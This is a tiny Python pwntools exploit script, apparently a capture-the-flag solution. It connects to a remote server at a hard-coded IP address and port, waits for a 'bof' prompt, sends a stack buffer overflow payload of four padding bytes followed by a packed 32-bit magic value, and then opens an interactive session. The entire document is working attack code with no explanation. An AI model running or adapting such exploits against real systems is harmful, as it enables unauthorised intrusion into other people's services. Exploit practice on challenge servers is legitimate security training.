from pwn import *

io = remote("61.147.171.35",57154)

payload = b'a'*4+p32(1853186401)

io.sendlineafter('bof',payload)

io.interactive()
